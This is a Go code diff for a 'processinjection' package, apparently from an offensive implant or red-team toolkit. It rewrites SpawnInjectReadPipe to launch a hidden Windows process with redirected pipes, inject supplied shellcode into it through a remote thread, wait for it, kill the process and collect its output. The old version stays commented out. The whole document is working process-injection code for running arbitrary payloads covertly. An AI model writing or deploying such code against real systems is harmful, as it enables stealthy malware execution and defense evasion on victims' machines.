@@ -4,12 +4,9 @@
 package processinjection
 
 import (
-	"bufio"
 	"debug/pe"
 	"errors"
 	"fmt"
-	"log"
-	"os/exec"
 	"strconv"
 	"strings"
 	"syscall"
@@ -22,6 +19,97 @@ import (
 	"golang.org/x/sys/windows"
 )
 
+func SpawnInjectReadPipe(shellcode []byte, exeToSpawn string) (string, error) {
+	var err error
+	saAttr := windows.SecurityAttributes{}
+	saAttr.Length = uint32(unsafe.Sizeof(saAttr))
+	saAttr.InheritHandle = 1
+	saAttr.SecurityDescriptor = nil
+	// create pipe for child process stdout
+	var hChildStdinRead windows.Handle
+	var hChildStdinWrite windows.Handle
+	var hChildStdoutRead windows.Handle
+	var hChildStdoutWrite windows.Handle
+	err = windows.CreatePipe(&hChildStdoutRead, &hChildStdoutWrite, &saAttr, 0)
+	if err != nil {
+		return "", err
+	}
+	err = windows.SetHandleInformation(windows.Handle(hChildStdoutRead), windows.HANDLE_FLAG_INHERIT, 0)
+	if err != nil {
+		return "", err
+	}
+	err = windows.CreatePipe(&hChildStdinRead, &hChildStdinWrite, &saAttr, 0)
+	if err != nil {
+		return "", err
+	}
+	err = windows.SetHandleInformation(windows.Handle(hChildStdinWrite), windows.HANDLE_FLAG_INHERIT, 0)
+	if err != nil {
+		return "", err
+	}
+	//create process
+	notepad, err := windows.UTF16PtrFromString(exeToSpawn)
+	if err != nil {
+		return "", err
+	}
+	sa := windows.StartupInfo{}
+	sa.Cb = uint32(unsafe.Sizeof(sa))
+	sa.StdErr = windows.Handle(hChildStdoutWrite)
+	sa.StdOutput = windows.Handle(hChildStdoutWrite)
+	sa.StdInput = windows.Handle(hChildStdinRead)
+	sa.Flags |= windows.STARTF_USESTDHANDLES
+	sa.Flags |= windows.STARTF_USESHOWWINDOW
+	sa.ShowWindow = windows.SW_HIDE
+	pi := windows.ProcessInformation{}
+	err = windows.CreateProcess(nil, notepad, nil, nil, true, windows.CREATE_NO_WINDOW, nil, nil, &sa, &pi)
+	if err != nil {
+		return "", err
+	}
+	windows.CloseHandle(pi.Thread)
+	windows.CloseHandle(windows.Handle(hChildStdoutWrite))
+	windows.CloseHandle(windows.Handle(hChildStdinRead))
+
+	pidStr := strconv.Itoa(int(pi.ProcessId))
+	hThread, err := RemoteInjectReturnThread(shellcode, pidStr)
+	if err != nil {
+		return "", err
+	}
+	// now we wait for our thread to finish then send a
+	var exitCode uint32
+	var STILL_RUNNING uint32 = 259
+	var loops int
+	for {
+		if loops > 60 {
+			// wait 60 seconds max
+			break
+		}
+		_, err := winapi.GetExitCodeThread(syscall.Handle(hThread), &exitCode)
+		if err != nil && !strings.Contains(err.Error(), "operation completed successfully") {
+			return "", err
+		}
+		if exitCode == STILL_RUNNING {
+			time.Sleep(1000 * time.Millisecond)
+			loops++
+		} else {
+			break
+		}
+	}
+	windows.TerminateProcess(pi.Process, 0)
+	windows.CloseHandle(pi.Process)
+	buffer := make([]byte, 10)
+	var nRead uint32
+	var results string
+	for {
+		err = windows.ReadFile(windows.Handle(hChildStdoutRead), buffer, &nRead, nil)
+		if err != nil {
+			break
+		}
+		results += string(buffer)
+	}
+	return results, nil
+
+}
+
+/*
 func SpawnInjectReadPipe(shellcode []byte, exeToSpawn string) (string, error) {
 	cmd := exec.Command(exeToSpawn)
 	cmd.SysProcAttr = new(syscall.SysProcAttr)
@@ -41,6 +129,7 @@ func SpawnInjectReadPipe(shellcode []byte, exeToSpawn string) (string, error) {
 	if err != nil {
 		return "", err
 	}
+	log.Println("Confirmed inject thread")
 	// now we wait for our thread to finish then send a
 	var exitCode uint32
 	var STILL_RUNNING uint32 = 259
@@ -55,6 +144,7 @@ func SpawnInjectReadPipe(shellcode []byte, exeToSpawn string) (string, error) {
 			break
 		}
 	}
+	time.Sleep(10 * time.Second)
 	// kill the process and then read from pipes.
 	cmd.Process.Kill()
 	stderrBuff := bufio.NewScanner(stderr)
@@ -67,10 +157,11 @@ func SpawnInjectReadPipe(shellcode []byte, exeToSpawn string) (string, error) {
 	for stdoutBuff.Scan() {
 		allText = append(allText, stdoutBuff.Text())
 	}
+	allText = append(allText, "\n [+] End of output")
 	completed := strings.Join(allText, "\n")
 	return completed, nil
 }
-
+*/
 func SpawnInject(shellcode []byte, exeToSpawn string) (string, error) {
 	arg0, err := syscall.UTF16PtrFromString(exeToSpawn)
 	if err != nil {
